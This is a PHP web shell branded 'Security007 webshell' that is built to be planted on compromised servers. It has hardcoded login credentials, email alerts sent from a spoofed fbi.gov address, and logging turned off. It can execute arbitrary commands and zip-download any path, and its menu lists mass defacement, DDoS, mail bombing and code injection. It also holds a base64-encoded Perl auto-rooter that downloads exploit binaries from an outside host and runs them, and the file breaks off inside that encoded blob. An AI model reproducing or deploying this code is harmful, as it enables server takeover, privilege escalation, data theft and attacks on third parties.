<?php
error_reporting(0);

ini_set('max_execution_time',0);
ini_set('memory_limit','999999999M');


function Zip($source, $destination) // Thanks to Alix Axel
{
    if (!extension_loaded('zip') || !file_exists($source)) {
        return false;
    }

    $zip = new ZipArchive();
    if (!$zip->open($destination, ZIPARCHIVE::CREATE)) {
        return false;
    }

    $source = str_replace('\\', '/', realpath($source));

    if (is_dir($source) === true)
    {
        $files = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($source), RecursiveIteratorIterator::SELF_FIRST);

        foreach ($files as $file)
        {
            $file = str_replace('\\', '/', realpath($file));

            if (is_dir($file) === true)
            {
                $zip->addEmptyDir(str_replace($source . '/', '', $file . '/'));
            }
            else if (is_file($file) === true)
            {
                $zip->addFromString(str_replace($source . '/', '', $file), file_get_contents($file));
            }
        }
    }
    else if (is_file($source) === true)
    {
        $zip->addFromString(basename($source), file_get_contents($source));
    }

    return $zip->close();
}

if(isset($_GET['zip'])) {
	$src = $_GET['zip'];
	$dst = getcwd()."/".basename($_GET['zip']).".zip";
	if (Zip($src, $dst) != false) {
		$filez = file_get_contents($dst);
		header("Content-type: application/octet-stream");
		header("Content-length: ".strlen($filez));
		header("Content-disposition: attachment; filename=\"".basename($dst)."\";");
		echo $filez;
	}
	exit;
}

// ------------------------------------- Some header Functions (Need to be on top) ---------------------------------\

/**************** Defines *********************************/

$greeting 		= "0o0o0 WELCOME MASTER ^.^ 0o0o0";
$user 			= "security007";
$pass 			= "security007";
$lock 			= "on"; // set this to off if you dont need the login page
$antiCrawler 		= "on"; // set this to on if u dont want your shell to be publicised in Search Engines ! (It increases the shell's Life')
$tracebackFeature 	= "on"; // set this feature to on to enable email alerts
$ownerEmail 		= "defacementsec007@gmail.com"; // use for sending traceback
$url 			= (!empty($_SERVER['HTTPS'])) ? "https://".$_SERVER['SERVER_NAME'].$_SERVER['REQUEST_URI'] : "http://".$_SERVER['SERVER_NAME'].$_SERVER['REQUEST_URI'];
$phpVersion		= phpversion();
$self			= $_SERVER["PHP_SELF"]; // Where am i
$sm 			= @ini_get('safe_mode');
$SEPARATOR 		= '/'; // Default Directory separator
$os 			= "N/D";

if(stristr(php_uname(),"Windows"))
{
        $SEPARATOR = '\\';
        $os = "Windows";
}

else if(stristr(php_uname(),"Linux"))
{
        $os = "Linux";
}

//*************************************************************/

// -------------- Traceback Functions

function sendLoginAlert()
{
    global $ownerEmail;
    global $url;
    $accesedIp = $_SERVER['REMOTE_ADDR'];
    $randomInt = rand(0,1000000);           # to avoid id blocking
    $from = "security007webshell$randomInt@fbi.gov"; 
    
    //echo $from;
    
    if(function_exists('mail'))
    {
        $subject = "Shell Accessed -- security007 webshell --";
        $message = "
Hey Owner ,
        
        Your Shell(security007 webshell) located at $url was accessed by $accesedIp
        
        If its not you :-
        
        1. Please check if the shell is secured.
        2. Change your user name and Password.
        3. Check if lock is 0n!

        Thanking You
        
Yours Faithfully
security007
        ";
        mail($ownerEmail,$subject,$message,'From:'.$from);
    }
}

//---------------------------------------------------------


if(function_exists('session_start') && $lock == 'on')
{
    session_start();
}
else
{
    // The lock will be set to 'off' if the session_start fuction is disabled i.e if sessions are not supported 
    $lock = 'off';
}

//logout

if(isset($_GET['logout']) && $lock == 'on')
{
    $_SESSION['authenticated'] = 0;
    session_destroy();
    header("location: ".$_SERVER['PHP_SELF']);
}

ini_set('max_execution_time',0);



/***************** Restoring *******************************/


ini_restore("safe_mode_include_dir");
ini_restore("safe_mode_exec_dir");
ini_restore("disable_functions");
ini_restore("allow_url_fopen");
ini_restore("safe_mode");
ini_restore("open_basedir");

if(function_exists('ini_set'))
{
    ini_set('error_log',NULL);  // No alarming logs
    ini_set('log_errors',0);    // No logging of errors
    ini_set('file_uploads',1);  // Enable file uploads
    ini_set('allow_url_fopen',1);   // allow url fopen 
}

else
{
    ini_alter('error_log',NULL);
    ini_alter('log_errors',0);
    ini_alter('file_uploads',1);
    ini_alter('allow_url_fopen',1);
}

// ----------------------------------------------------------------------------------------------------------------


?>
<html>
<head>
<title>Security007 webshell</title>

<?php
if($antiCrawler != 'off')
{
    ?>
    <meta name="ROBOTS" content="NOINDEX, NOFOLLOW" />
    <?php
}
?>

<style>

/*
==========================    
    CSS Section
==========================
*/

* {
    padding:0;
    margin:0;
}
button.tool{
	color:red;
	background:silver;
	border:2px;
	border-color:blue;
}
a{
	color:silver;
	text-decoration:none;
}
html, body {
	height: 100%;
}

#container {
min-height: 100%;
margin-bottom: -330px;
position: relative;
}

#footer {
height: 330px;
position: relative;
}

.clearfooter {
height: 330px;
clear: both;
}

.alert
{
    background:red;
    color:white;
    font-weight:bold;
}
td.info
{
    width:0px;
}

.bind 
{
    border: 1px solid #333333;
    margin: 15px auto 0;
    font-size: small;
}

div.end *
{
    font-size:small;
}

div.end 
{
    width:100%;
    background:black;
}

p.blink
{
    text-decoration: blink;
}

body 
{
    background-color:black;
    color:red;
    font-family:Tahoma,Verdana,Arial;
    font-size: small;
}

input.own {
    background-color: black;
    color: white;
    border : 1px solid #ccc;
}

blockquote.small
{
    font-size: smaller;
    color: silver;
    text-align: center;
}

table.files
{
    border-spacing: 10px;
    font-size: small;
}

h1 {
    padding: 4px;
    padding-bottom: 0px;
    margin-right : 5px;
}
div.logo
{
    border-right: 1px aqua solid;
}
div.header
{
    padding-left: 5px;
    font-size: small;
    text-align: left;
}
div.nav
{
    margin-top:1px;
    height:60px;
    background-color: black;
}
div.nav ul
{
    list-style: none;
    padding: 4px;
}
div.nav li
{
    float: left;
    margin-right: 10px;
    text-align:center;
}
textarea.cmd
{
    border : 1px solid #111;
    background-color : blue;
    font-family: Shell;
    color : white;
    margin-top: 30px;
    font-size:small;
}

input.cmd
{
    background-color:black;
    color: white;
    width: 400px;
    border : 1px solid #ccc;

}
td.maintext
{
    font-size: large;
}
#margins
{
    margin-left: 10px;
    margin-top: 10px;
    color:white;
}
table.top
{
    border-bottom: 1px solid red;
    width: 100%;

}
#borders
{
    border-top : 1px solid red;
    border-left:1px solid red;
    border-bottom: 1px solid red;
    border-right: 1px solid red;
    margin-bottom:0;
}
td.file a , .file a
{
    text-decoration:none;
}
a.dir
{
    font-weight:bold;
    text-decoration:none;
}
td.dir a
{
    text-decoration:none;
}
td.download,td.download2
{
    color:green;
}
#spacing
{
    padding:10px;
    margin-left:200px;
}
th.header
{
    background: none repeat scroll 0 0 #191919;
    color: white;
	background:red;
    border : 1px solid silver;
}
p.alert_red
{
    background : red;
    color: white;
}

p.alert_green
{
    background :#00ff00;
    color: black;
}
/*

--------------------------------CSS END------------------------------------------------------

*/
</style>

</head>

<body color="silver" bgcolor="black">

<div id='container'>
<?php
if(isset($_POST['user']) && isset($_POST['pass']) && $lock == 'on')
{
    if( $_POST['user'] == $user &&
         $_POST['pass'] == $pass )
    {
            $_SESSION['authenticated'] = 1;
            // --------------------- Tracebacks --------------------------------
            if($tracebackFeature == 'On')
            {
                sendLoginAlert();
            }
            // ------------------------------------------------------------------
    }
}

if($lock == 'off')
{?>
    <p class="alert_red"><b>Lock is Switched Off! , The shell can be accessed by anyone!</b></p>
<?php
}

if($lock == 'on' && (!isset($_SESSION['authenticated']) || $_SESSION['authenticated']!=1) )
{


?>
                   <?php
                   // <div id="wassup">
                   //      include("http://ani-shell.sourceforge.net/wassup.txt");
                   //</div>
                   ?>
				   <center>
<table cellspacing="0" cellpadding="4">   
<tr>
<td>  
<font color="red">            
<pre>
============================================================
=</font><font color="white">  ######## </font><font color="red">=</font><font color="white"> ########  #############</font><font color="white">  #Majulahindonesiaku </font><font color="red">=
=</font><font color="white"> #        # #        #           # </font><font color="red">==</font><font color="white"> #JayalahTanahAirku </font><font color="red">==
=</font><font color="white"> #  #  #  # #  #  #  #       ### </font><font color="red">====</font><font color="white"> #DamailahBangsaku </font><font color="red">===
</font><font color="red">=</font><font color="white"> #  ####  # #  ####  #       # </font><font color="red">============================
</font><font color="red">=</font><font color="white"> #        # #        #     # </font><font color="red">==============================
</font><font color="red">=</font><font color="white">  ######## </font><font color="red">=</font><font color="white"> ########    # </font><font color="red">======<font color="white"> WBBSHELL V 2.1 </font><font color="red">==========
</font><font color="red">============================================================
 </font></pre>
</td></tr></table></center>
                <center><font color="white" size="5"><code><?php echo $greeting;?></h1></code></font><br /><br />
                <form method="POST" action="<?php echo $_SERVER['PHP_SELF'];?>">
                <input name="user" value="" placeholder="Username" style="border-color:red"/> <input name="pass" placeholder="Password" style="border-color:red" type="password" value=""/> <input class="own" type="Submit" value="Masuk" style="border-color:red"/>
                </form></center>
				
				
          
<?php
}
//---------------------------------- We are authenticated now-------------------------------------
//Launch the shell
else 
{
    //---------------------------------- Fuctions ---------------------------------------------------

    function showDrives()
    {
        global $self;
        foreach(range('A','Z') as $drive)
        {
            if(is_dir($drive.':\\'))
            {
                ?>
                <a class="dir" href='<?php echo $self ?>?dir=<?php echo $drive.":\\"; ?>'>
                    <?php echo $drive.":\\" ?>
                </a> 
                <?php
            }
        }
    }

    function HumanReadableFilesize($size)
    {
 
        $mod = 1024;
 
        $units = explode(' ','B KB MB GB TB PB');
        for ($i = 0; $size > $mod; $i++) 
        {
            $size /= $mod;
        }
 
        return round($size, 2) . ' ' . $units[$i];
    }

function getClientIp()
{
    echo $_SERVER['REMOTE_ADDR'];
}

function getServerIp()
{
    echo getenv('SERVER_ADDR');
}
function getSoftwareInfo()
{
    echo php_uname();
}
function diskSpace()
{
    echo HumanReadableFilesize(disk_total_space("/"));
}
function freeSpace()
{
    echo HumanReadableFilesize(disk_free_space("/"));
}
function getSafeMode()
{
        global $sm;
		echo($sm?"ON (Most of the Features will Not Work)":"OFF");
        
}

function getDisabledFunctions()
{
    if(!ini_get('disable_functions'))
    {
		echo "None";
    }
    else
    {
			echo @ini_get('disable_functions');
    }
}

function getFilePermissions($file)
{
    
$perms = fileperms($file);

if (($perms & 0xC000) == 0xC000) {
    // Socket
    $info = 's';
} elseif (($perms & 0xA000) == 0xA000) {
    // Symbolic Link
    $info = 'l';
} elseif (($perms & 0x8000) == 0x8000) {
    // Regular
    $info = '-';
} elseif (($perms & 0x6000) == 0x6000) {
    // Block special
    $info = 'b';
} elseif (($perms & 0x4000) == 0x4000) {
    // Directory
    $info = 'd';
} elseif (($perms & 0x2000) == 0x2000) {
    // Character special
    $info = 'c';
} elseif (($perms & 0x1000) == 0x1000) {
    // FIFO pipe
    $info = 'p';
} else {
    // Unknown
    $info = 'u';
}

// Owner
$info .= (($perms & 0x0100) ? 'r' : '-');
$info .= (($perms & 0x0080) ? 'w' : '-');
$info .= (($perms & 0x0040) ?
            (($perms & 0x0800) ? 's' : 'x' ) :
            (($perms & 0x0800) ? 'S' : '-'));

// Group
$info .= (($perms & 0x0020) ? 'r' : '-');
$info .= (($perms & 0x0010) ? 'w' : '-');
$info .= (($perms & 0x0008) ?
            (($perms & 0x0400) ? 's' : 'x' ) :
            (($perms & 0x0400) ? 'S' : '-'));

// World
$info .= (($perms & 0x0004) ? 'r' : '-');
$info .= (($perms & 0x0002) ? 'w' : '-');
$info .= (($perms & 0x0001) ?
            (($perms & 0x0200) ? 't' : 'x' ) :
            (($perms & 0x0200) ? 'T' : '-'));

return $info;

}

// Dir size

/**
 * Get the directory size
 * @param directory $directory
 * @return integer
 */
function dirSize($directory) {
    $size = 0;
    foreach(new RecursiveIteratorIterator(new RecursiveDirectoryIterator($directory)) as $file){
        try {       
            $size += $file->getSize();
        }
        catch (Exception $e){    // Symlinks and other shits
            $size += 0;
        }
    }
    return $size;
}

/***********************************************************/
// exec_all , A function used to execute commands , This function will only execute if the Safe Mode is
// Turned OFF!
/**********************************************************/


function exec_all($command)
{
    
    $output = '';
    if(function_exists('exec'))
    {   
        exec($command,$output);
        $output = join("\n",$output);
    }
    
    else if(function_exists('shell_exec'))
    {
        $output = shell_exec($command);
    }
    
    else if(function_exists('popen'))
    {
        $handle = popen($command , "r"); // Open the command pipe for reading
        if(is_resource($handle))
        {
            if(function_exists('fread') && function_exists('feof'))
            {
                while(!feof($handle))
                {
                    $output .= fread($handle, 512);
                }
            }
            else if(function_exists('fgets') && function_exists('feof'))
            {
                while(!feof($handle))
                {
                    $output .= fgets($handle,512);
                }
            }
        }
        pclose($handle);
    }
    
    
    else if(function_exists('system'))
    {
        ob_start(); //start output buffering
        system($command);
        $output = ob_get_contents();    // Get the ouput 
        ob_end_clean();                 // Stop output buffering
    }
    
    else if(function_exists('passthru'))
    {
        ob_start(); //start output buffering
        passthru($command);
        $output = ob_get_contents();    // Get the ouput 
        ob_end_clean();                 // Stop output buffering            
    }
    
    else if(function_exists('proc_open'))
    {
        $descriptorspec = array(
                1 => array("pipe", "w"),  // stdout is a pipe that the child will write to
                );
        $handle = proc_open($command ,$descriptorspec , $pipes); // This will return the output to an array 'pipes'
        if(is_resource($handle))
        {
            if(function_exists('fread') && function_exists('feof'))
            {
                while(!feof($pipes[1]))
                {
                    $output .= fread($pipes[1], 512);
                }
            }
            else if(function_exists('fgets') && function_exists('feof'))
            {
                while(!feof($pipes[1]))
                {
                    $output .= fgets($pipes[1],512);
                }
            }
        }
        pclose($handle);
    }

    return(htmlspecialchars($output));
    
}

function magicQuote($text)
{
    if (!get_magic_quotes_gpc())
    {
        return $text;
    }
    return stripslashes($text);
}

function md5Crack($hash , $list)
{
    $fd = fopen($list,"r");
    if( strlen($hash) != 32  || $fd == FALSE)
    {
        // echo "$hash , " . strlen($hash) ." , $list , $fd"; // Debugging
        return "<p class='alert_red'>Hash or List invalid!</p>";
    }
    else
    {
        while (! feof( $fd ))
        {
            if( ($pwdList = fgets( $fd, 1024 )) == FALSE)
            {
                break;
            }
            $pwdList = trim($pwdList);
            
            if(md5($pwdList) == $hash )
            {
                    return "<script>alert('Password Cracked');</script>\n<h2>Hash Cracked</h2><br /><br />\n<p class='alert_green'>Planintext : $pwdList</p>";
            }
        }
            
    }
}

function exec_query_mysql($query,$sql_server,$sql_port,$sql_db,$sql_user,$sql_pass)
{
    $link = mysql_connect($sql_server.":".$port,$sql_user,$sql_pass);
    if(!$link)
    {
        return 'Could not connect: ' . mysql_error();
    }
    $resource = mysql_query($query);
    if(!$resource) return(mysql_error());
}

//------------------------------------------------------------------------------------------------
if(isset($_GET['dir'])) {
	$dir = $_GET['dir'];
	chdir($_GET['dir']);
} else {
	$dir = getcwd();
}
$dir = str_replace("\\","/",$dir);
$scdir = explode("/", $dir);
function exe($cmd) { 	
if(function_exists('system')) { 		
		@ob_start(); 		
		@system($cmd); 		
		$buff = @ob_get_contents(); 		
		@ob_end_clean(); 		
		return $buff; 	
	} elseif(function_exists('exec')) { 		
		@exec($cmd,$results); 		
		$buff = ""; 		
		foreach($results as $result) { 			
			$buff .= $result; 		
		} return $buff; 	
	} elseif(function_exists('passthru')) { 		
		@ob_start(); 		
		@passthru($cmd); 		
		$buff = @ob_get_contents(); 		
		@ob_end_clean(); 		
		return $buff; 	
	} elseif(function_exists('shell_exec')) { 		
		$buff = @shell_exec($cmd); 		
		return $buff; 	
	} 
}
$wget = (exe('wget --help')) ? "<font color=silver>Enabled</font>" : "<font color=blue>Disabled</font>";
$perl = (exe('perl --help')) ? "<font color=silver>Enabled</font>" : "<font color=blue>Disabled</font>";
$python = (exe('python --help')) ? "<font color=silver>Enabled</font>" : "<font color=blue>Disabled</font>";
?>

<table class="top">
    <tbody>
        <tr>
            <td width="300px;">
            <div class="logo">
                <center><code><font size="5" color="blue">SECURITY007 WEBSHELL</code></center></font>
            </div>
            </td>
            <td>
            <div class="header">
			<font color="silver" >
            <?php getSoftwareInfo(); ?></font><br />
Your IP : <font color="silver" ><?php getClientIp(); ?></font> <font color="red" >|</font> Server IP : <font color="silver" ><?php getServerIp();?></font> <br />           
            Disable functions : <font color='silver'><?php getDisabledFunctions(); ?> <br></font>
			<?php
			if($os == 'Windows'){ echo "Drive: ";echo showDrives();} 
            echo "<br>Current DIR: ";
			foreach($scdir as $c_dir => $cdir) {	
				echo "<a href='?dir=";
				for($i = 0; $i <= $c_dir; $i++) {
					echo $scdir[$i];
					if($i != $c_dir) {
					echo "/";
				}
			}
			echo "'>$cdir</a>/";
			}?>
			</div>
            </td>
        </tr>
    </tbody>
</table>
<div class="header" id="borders">
            Server ADMIN: <font color='silver'><?php echo $_SERVER['SERVER_ADMIN'];?></font> <font color="silver" >|</font>
            PHP VERSION : <font color='silver'><?php echo $phpVersion; ?></font> <font color="silver" >|</font>
            Curl : <?php echo function_exists('curl_version')?("<font color='silver'>Enabled</font>"):("<font color='blue'>Disabled</font>"); ?> <font color="silver" >|</font>
            Wget : <?php echo $wget; ?> <font color="silver" >|</font>
            MySQL : <?php  echo function_exists('mysql_connect')?("<font color='silver'>Enabled</font>"):("<font color='blue'>Disabled</font>");?> <font color="silver" >|</font>
            Python : <?php echo $python; ?> <font color="silver" >|</font>
            Perl : <?php echo $perl; ?> <font color="silver" >|</font>
            Safe Mode :<font color="silver" > <?php getSafeMode(); ?></font><font color="silver" > |</font>
			Space : <font color='silver'><?php diskSpace(); ?> </font><font color="silver" >|</font>
            Free : <font color='silver'><?php freeSpace(); ?></font>
        </table>
</div>
<div class="nav">
<center>
<p><center> TOOLS </center>
    <a href="<?php echo $self;?>">[Home]</a>
    <a href="<?php echo '?dir='.$dir.'&upload';?>">[Upload]</a>
    <a href="<?php echo '?dir='.$dir.'&shell';?>">[Shell]</a>
	<a href="<?php echo '?dir='.$dir.'&mass'?>">[Mass Deface]</a>
	<a href="<?php echo '?dir='.$dir.'&config'?>">[Config]</a>
	<a href="<?php echo '?dir='.$dir.'&python_sym'?>">[Python Symlink]</a>
	<a href="<?php echo '?dir='.$dir.'&sym'?>">[Symlink]</a>
	<a href="<?php echo '?dir='.$dir.'&cgi'?>">[Cgi Telnet]</a>
	<a href="<?php echo '?dir='.$dir.'&autoedit'?>">[Auto Edit User]</a>
	<a href="<?php echo '?dir='.$dir.'&adminer'?>">[Adminer]</a>
	<a href="<?php echo '?dir='.$dir.'&toket'?>">[Socket Server]</a>
	<a href="<?php echo '?dir='.$dir.'&localroot'?>">[Localroot]</a>
	<a href="<?php echo '?dir='.$dir.'&depes'?>">[Security007 Private Deface]</a>
    <a href="<?php echo '?dir='.$dir.'&r00t'?>">[Aut0 R00t3r (Unix/Linux)]</a>
    <a href="<?php echo '?dir='.$dir.'&dos';?>">[DDoS]</a>
    <a href="<?php echo '?dir='.$dir.'&fuzz';?>">[Web-Server Fuzzer]</a>
    <a href="<?php echo '?dir='.$dir.'&mail'?>">[Mass Mailer]</a>
    <a href="<?php echo '?dir='.$dir.'&bomb'?>">[Mail Bomber]</a>
    <a href="<?php echo '?dir='.$dir.'&connect'?>">[Connect]</a>
    <a href="<?php echo '?dir='.$dir.'&injector'?>">[Mass Code Injector]</a>
    <a href="<?php echo '?dir='.$dir.'&obfuscate'?>">[PHP Obfuscator]</a>
    <a href="<?php echo '?dir='.$dir.'&eval'?>">[PHP Evaluate]</a>
    <a href="<?php echo '?dir='.$dir.'&md5'?>">[MD5 Cracker]</a>
    <a href="<?php echo '?dir='.$dir.'&gdork'?>">[Google Dork Creator]</a>


    <?php if($lock == 'on')
    {
    ?>
        <a href="<?php echo $self.'?logout'?>">[I m Out!]</a></li>
    <?php
    }
    ?>
<center>
<p>
</div>

<center>
<?php
//-------------------------------- Check what he wants -------------------------------------------

// Shell

if(isset($_GET['shell']))
{
    echo "<br><br><form method='post'>
	<font style='text-decoration: underline;'>".$user."@".gethostbyname($_SERVER['HTTP_HOST']).":~# </font>
	<input type='text' size='30' height='10' name='cmd'><input type='submit' class='own' name='do_cmd' value='>>'>
	</form>";
    if ($_POST['do_cmd']){
		echo '<code><pre><center><table width=70% ><tr><td><pre>'.exec_all($_POST['cmd']).'</td></tr></table><pre></center></code>';
	}
}

// Auto Rooter (Linux/Unix Only!) with Perl Installed

else if(isset($_GET['r00t']))
{
    // Note : The Perl Auto Rooter Perl Script was originally written by iskorpitx , All credits to him for an awesome
    // Piece of code , and thanks to eXes0ul for providing me the links . ;) 
    
    $r00t =
"IyEvdXNyL2Jpbi9wZXJsIA0KIyBFeHBsb2l0IHRvb2xzIHYyLjAgY29kZWQgYnkgaXNrb3JwaXR4
IChUdXJraXNoIEhhY2tlcikNCiMgbGludXggc2VydmVybGVyZGUgZ2VjZXJsaWRpcg0KIyBpeWkg
c2Fuc2xhcjopDQojIGJ5IGlza29ycGl0eA0KeyANCnN5c3RlbSgid2dldCBodHRwOi8vd2FyMTk3
MS5jb20vQ01TX0ZJTEVTL2ZpbGUvY2MvaXNrb3JwaXR4Iik7ICANCnN5c3RlbSgiY2htb2QgNzc3
IGlza29ycGl0eCIpOyANCnN5c3RlbSgiLi9pc2tvcnBpdHgiKTsgDQpzeXN0ZW0oImlkIik7IA0K
c3lzdGVtKCJ3Z2V0IGh0dHA6Ly93YXIxOTcxLmNvbS9DTVNfRklMRVMvZmlsZS9jYy80NCIpOyAg
DQpzeXN0ZW0oImNobW9kIDc3NyA0NCIpOyANCnN5c3RlbSgiLi80NCIpOyANCnN5c3RlbSgiaWQi
KTsNCnN5c3RlbSgid2dldCBodHRwOi8vd2FyMTk3MS5jb20vQ01TX0ZJTEVTL2ZpbGUvY2MvOTUy
MSIpOyAgDQpzeXN0ZW0oImNobW9kIDc3NyA5NTIxIik7IA0Kc3lzdGVtKCIuLzk1MjEiKTsgDQpz
eXN0ZW0oImlkIik7ICANCnN5c3RlbSgid2dldCBodHRwOi8vd2FyMTk3MS5jb20vQ01TX0ZJTEVT
L2ZpbGUvY2MvZnJvb3QiKTsgIA0Kc3lzdGVtKCJjaG1vZCA3NzcgZnJvb3QiKTsgDQpzeXN0ZW0o
Ii4vZnJvb3QiKTsgDQpzeXN0ZW0oImlkIik7DQpzeXN0ZW0oImlkIik7DQpzeXN0ZW0oImlkIik7
DQpzeXN0ZW0oImlkIik7DQpzeXN0ZW0oImlkIik7DQpzeXN0ZW0oIndnZXQgMjc3MDQuYyBkb3du
bG9hZHMuc2VjdXJpdHlmb2N1cy5jb20vdnVsbmVyYWJpbGl0aWVzL2V4cGxvaXRzLzI3NzA0LmMi
KTsgDQpzeXN0ZW0oImdjYyAyNzcwNC5jIC1vIDI3NzA0Iik7ICANCnN5c3RlbSgiY2htb2QgNzc3
IDI3NzA0Iik7IA0Kc3lzdGVtKCIuLzI3NzA0Iik7IA0Kc3lzdGVtKCJpZCIpOyANCnByaW50ICJJ
ZiB1IHIgcjAwdCBzdG9wIHhwbCB3aXRoIGN0cmwrY1xuIjsNCnN5c3RlbSgid2dldCBodHRwOi8v
d2FyMTk3MS5jb20vQ01TX0ZJTEVTL2ZpbGUvY2MvMTgtMS5jIik7IA0Kc3lzdGVtKCJnY2MgLVdh
bGwgLW8gMTgtMSAxOC0xLmMiKTsgDQpzeXN0ZW0oImdjYyAtV2FsbCAtbTY0IC1vIDE4LTMgMTgt
MS5jIik7IA0Kc3lzdGVtKCJjaG1vZCA3NzcgMTgtMSIpOyANCnN5c3RlbSgiY2htb2QgNzc3IDE4
LTMiKTsgDQpzeXN0ZW0oIi4vMTgtMSIpOyANCnN5c3RlbSgiaWQiKTsgDQpzeXN0ZW0oIi4vMTgt
MyIpOyANCnN5c3RlbSgiaWQiKTsgDQpwcmludCAiSWYgdSByIHIwMHQgc3RvcCB4cGwgd2l0aCBj
dHJsK2NcbiI7DQpzeXN0ZW0oIndnZXQgaHR0cDovL3dhcjE5NzEuY29tL0NNU19GSUxFUy9maWxl
L2NjLzE4LTIiKTsgIA0Kc3lzdGVtKCJjaG1vZCA3NzcgMTgtMiIpOyANCnN5c3RlbSgiLi8xOC0y
Iik7IA0Kc3lzdGVtKCJpZCIpOyANCnByaW50ICJJZiB1IHIgcjAwdCBzdG9wIHhwbCB3aXRoIGN0
cmwrY1xuIjsNCnN5c3RlbSgid2dldCBodHRwOi8vd2FyMTk3MS5jb20vQ01TX0ZJTEVTL2ZpbGUv
Y2MvMTgtMSIpOyAgDQpzeXN0ZW0oImNobW9kIDc3NyAxOC0xIik7IA0Kc3lzdGVtKCIuLzE4LTEi
KTsgDQpzeXN0ZW0oImlkIik7IA0KcHJpbnQgIklmIHUgciByMDB0IHN0b3AgeHBsIHdpdGggY3Ry
bCtjXG4iOw0Kc3lzdGVtKCJ3Z2V0IGh0dHA6Ly93YXIxOTcxLmNvbS9DTVNfRklMRVMvZmlsZS9j
Yy9ydW4iKTsgIA0Kc3lzdGVtKCJjaG1vZCA3NzcgcnVuIik7IA0Kc3lzdGVtKCIuL3J1biIpOyAN
CnN5c3RlbSgiaWQiKTsgDQpwcmludCAiSWYgdSByIHIwMHQgc3RvcCB4cGwgd2l0aCBjdHJsK2Nc
biI7DQpzeXN0ZW0oIndnZXQgaHR0cDovL3dhcjE5NzEuY29tL0NNU19GSUxFUy9maWxlL2NjL2V4
cGxvaXQuYyIpOyAgDQpwcmludCAiSWYgdSByIHIwMHQgc3RvcCB4cGwgd2l0aCBjdHJsK2NcbiI7
DQpzeXN0ZW0oIndnZXQgcnVuX2V4cGxvaXRzLnNoIHdnZXQgaHR0cDovL3dhcjE5NzEuY29tL0NN
U19GSUxFUy9maWxlL2NjL3J1bl9leHBsb2l0cy5zaCIpOyAgDQpzeXN0ZW0oImNobW9kIDc3NyBy
dW5fZXhwbG9pdHMuc2giKTsgDQpzeXN0ZW0oIi4vcnVuX2V4cGxvaXRzLnNoIik7IA0KcHJpbnQg
IklmIHUgciByMDB0IHN0b3AgeHBsIHdpdGggY3RybCtjXG4iOw0Kc3lzdGVtKCJ3Z2V0IGh0dHA6
Ly93YXIxOTcxLmNvbS9DTVNfRklMRVMvZmlsZS9jYy9leHBsb2l0Iik7ICANCnN5c3RlbSgiY2ht
b2QgNzc3IGV4cGxvaXQiKTsgDQpzeXN0ZW0oIi4vZXhwbG9pdCIpOyANCnByaW50ICJJZiB1IHIg
cjAwdCBzdG9wIHhwbCB3aXRoIGN0cmwrY1xuIjsNCnN5c3RlbSgid2dldCBodHRwOi8vd2FyMTk3
MS5jb20vQ01TX0ZJTEVTL2ZpbGUvY2MvcnVuMiIpOyAgDQpzeXN0ZW0oImNobW9kIDc3NyBydW4y
Iik7IA0Kc3lzdGVtKCIuL3J1bjIiKTsgDQpzeXN0ZW0oImlkIik7IA0Kc3lzdGVtKCJ3Z2V0IGV4
cCBodHRwOi8vd2FyMTk3MS5jb20vQ01TX0ZJTEVTL2ZpbGUvY2MvZXhwIik7ICANCnN5c3RlbSgi
Y2htb2QgNzc3IGV4cCIpOyANCnN5c3RlbSgiLi9leHAiKTsgDQpzeXN0ZW0oImlkIik7IA0Kc3lz
dGVtKCJ3Z2V0IGh0dHA6Ly93YXIxOTcxLmNvbS9DTVNfRklMRVMvZmlsZS9jYy9leHAxIik7ICAN
CnN5c3RlbSgiY2htb2QgNzc3IGV4cDEiKTsgDQpzeXN0ZW0oIi4vZXhwMSIpOyANCnN5c3RlbSgi
aWQiKTsgDQpzeXN0ZW0oIndnZXQgaHR0cDovL3dhcjE5NzEuY29tL0NNU19GSUxFUy9maWxlL2Nj
L2V4cDIiKTsgIA0Kc3lzdGVtKCJjaG1vZCA3NzcgZXhwMiIpOyANCnN5c3RlbSgiLi9leHAyIik7
IA0Kc3lzdGVtKCJpZCIpOyANCnN5c3RlbSgid2dldCBodHRwOi8vd2FyMTk3MS5jb20vQ01TX0ZJ
TEVTL2ZpbGUvY2MvZXhwMyIpOyAgDQpzeXN0ZW0oImNobW9kIDc3NyBleHAzIik7IA0Kc3lzdGVt
KCIuL2V4cDMiKTsgDQpzeXN0ZW0oImlkIik7IA0Kc3lzdGVtKCJ3Z2V0IGV4cDQgaHR0cDovL3dh
cjE5NzEuY29tL0NNU19GSUxFUy9maWxlL2NjL2V4cDQiKTsgIA0Kc3lzdGVtKCJjaG1vZCA3Nzcg
ZXhwNCIpOyANCnN5c3RlbSgiLi9leHA0Iik7IA0Kc3lzdGVtKCJpZCIpOyANCnN5c3RlbSgid2dl
dCBodHRwOi8vd2FyMTk3MS5jb20vQ01TX0ZJTEVTL2ZpbGUvY2MvZXhwNSIpOyAgDQpzeXN0ZW0o
ImNobW9kIDc3NyBleHA1Iik7IA0Kc3lzdGVtKCIuL2V4cDUiKTsgDQpzeXN0ZW0oImlkIik7IA0K
c3lzdGVtKCJ3Z2V0IGh0dHA6Ly93YXIxOTcxLmNvbS9DTVNfRklMRVMvZmlsZS9jYy9leHA2Iik7
ICANCnN5c3RlbSgiY2htb2QgNzc3IGV4cDYiKTsgDQpzeXN0ZW0oIi4vZXhwNiIpOyANCnN5c3Rl
bSgiaWQiKTsgDQpzeXN0ZW0oIndnZXQgaHR0cDovL3dhcjE5NzEuY29tL0NNU19GSUxFUy9maWxl
L2NjL2V4cDciKTsgIA0Kc3lzdGVtKCJjaG1vZCA3NzcgZXhwNyIpOyANCnN5c3RlbSgiLi9leHA3
Iik7IA0Kc3lzdGVtKCJpZCIpOyANCnN5c3RlbSgid2dldCBodHRwOi8vd2FyMTk3MS5jb20vQ01T
X0ZJTEVTL2ZpbGUvY2MvZXhwOCIpOyAgDQpzeXN0ZW0oImNobW9kIDc3NyBleHA4Iik7IA0Kc3lz
dGVtKCIuL2V4cDgiKTsgDQpzeXN0ZW0oImlkIik7IA0Kc3lzdGVtKCJ3Z2V0IGh0dHA6Ly93YXIx
OTcxLmNvbS9DTVNfRklMRVMvZmlsZS9jYy9leHA5Iik7ICANCnN5c3RlbSgiY2htb2QgNzc3IGV4
cDkiKTsgDQpzeXN0ZW0oIi4vZXhwOSIpOyANCnN5c3RlbSgiaWQiKTsgDQpwcmludCAiSWYgdSBy
IHIwMHQgc3RvcCB4cGwgd2l0aCBjdHJsK2NcbiI7DQpzeXN0ZW0oIndnZXQgaHR0cDovL3dhcjE5
